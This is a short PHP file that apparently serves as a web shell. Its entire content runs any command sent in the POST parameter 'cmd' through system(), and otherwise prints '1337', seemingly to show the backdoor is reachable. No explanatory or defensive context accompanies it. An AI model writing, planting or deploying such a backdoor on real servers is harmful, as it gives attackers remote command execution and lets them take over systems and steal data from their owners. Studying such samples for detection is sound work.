<?php 
if(isset($_POST["cmd"])){
    system($_POST["cmd"]);
} else {
    echo "1337";
}
